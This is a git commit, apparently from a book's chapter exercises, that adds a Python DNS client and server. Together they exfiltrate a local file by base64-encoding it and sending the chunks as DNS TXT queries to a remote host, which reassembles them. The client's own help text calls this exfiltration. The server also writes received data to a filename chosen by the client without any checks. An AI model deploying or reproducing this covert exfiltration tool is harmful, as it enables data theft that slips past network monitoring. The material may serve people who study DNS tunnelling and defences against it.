101e53bcab6899fbf4a28b4ecdcdb68cca13310d
freedomfred <freedomfred@gmail.com>
2019-07-28 16:50:44 -0700

    file transfer complete

---
+++ Ch3/DNSClient.py
@@ -0,0 +1,59 @@
+
+import socket
+import dnslib
+import argparse,sys,time
+import base64
+from hashlib import md5
+
+
+
+
+def tcp_dns_record(host, qtype, server,tcp):
+
+    if isinstance(qtype, str):
+        query = dnslib.DNSRecord.question(host, qtype=qtype)
+    else:
+        query = dnslib.DNSRecord(q=dnslib.DNSQuestion(host, qtype))
+    query_data = query.pack()
+    record = query.send(server,tcp=tcp)
+    return record
+
+def chunkstring(string, length):
+    return (string[0+i:length+i] for i in range(0, len(string), length))
+
+if __name__ == "__main__":
+
+
+    p = argparse.ArgumentParser(description="DNS Client")
+    p.add_argument("--file","-f",
+                    help="local file you want to exfiltrate", required = True)
+    p.add_argument("--server","-s",default="8.8.8.8",
+                    metavar="<address:port>",
+                    help="Server address:port (default:8.8.8.8:53) (port is optional)")
+    p.add_argument("--tcp",action='store_true',default=False,
+                    help="Use TCP (default: UDP)")
+    
+    args = p.parse_args()
+
+    address,_,port = args.server.partition(':')
+    port = str(port or 53)
+
+    f = open(args.file, 'rb') 
+    content = f.read() 
+    hashedWord = md5(content).hexdigest()
+    print(hashedWord, md5(content))
+    content_encoded = base64.standard_b64encode(content)
+    chunked_content = chunkstring(content_encoded,63)
+    print("Sending file "+args.file+ " to "+address+":"+port)
+    
+    tcp_dns_record(args.file+"|"+str(len(content_encoded))+"|"+hashedWord, dnslib.QTYPE.TXT,address,args.tcp)
+    #print(content_encoded)
+    for chunk in chunked_content:
+        tcp_dns_record(chunk, dnslib.QTYPE.TXT,address,args.tcp)
+
+    print("File sent")
+
+    
+    
+    #
+
--- Ch3/DNSServer.py
+++ Ch3/DNSServer.py
@@ -3,20 +3,60 @@ import threading
 import socket
 import socketserver
 import dnslib
-
+import base64
+from hashlib import md5
 
 
 class TCPDNSHandler(socketserver.BaseRequestHandler):
+    filesInProgress = {}
+
+    def processRequest(self, questions):
+        for question in questions:
+            if (question.qtype == dnslib.QTYPE.TXT):
+                #only process TXT record requests
+                content = str(question.qname)[:-1]
+
+                if self.client_address[0] in self.filesInProgress:
+                    self.filesInProgress[self.client_address[0]][3] += content
+                    self.filesInProgress[self.client_address[0]][1] -= len(content)
+                    print("Left: "+str(self.filesInProgress[self.client_address[0]][1]))
+                    if (self.filesInProgress[self.client_address[0]][1] == 0):
+                        #we have received the entire file. Time to write it.
+                        content_decoded = base64.standard_b64decode(self.filesInProgress[self.client_address[0]][3])
+                        with open(self.filesInProgress[self.client_address[0]][0],'wb') as newfile:
+                            newfile.write(content_decoded)
+
+                        hashedWord = md5(content_decoded).hexdigest()
+                        if (self.filesInProgress[self.client_address[0]][2] == hashedWord):
+                            print("File successfully received")
+                        else:
+                            print("File received but failed hash:")
+
+                        del self.filesInProgress[self.client_address[0]]
+                        
+                        
+
+
+                        
+
+                    
+                else:
+                    # new connection. we expect a file name
+                    print("new file upload: ",content)
+                    parts = content.split("|")
+                    self.filesInProgress[self.client_address[0]]= [parts[0],int(parts[1]),parts[2],""]
 
 
     def handle(self):
         # self.request is the TCP socket connected to the client
         self.data = self.request.recv(8192).strip()
-        print("{} wrote:".format(self.client_address[0]))
+        #print("Request from {}".format(self.client_address[0]))
         
 
         req = dnslib.DNSRecord.parse(self.data[2:])
-        print(req)
+        #print(req.questions)
+        
+        self.processRequest(req.questions)
 
         # just send back the same data, but upper-cased
         self.request.sendall(self.data.upper())
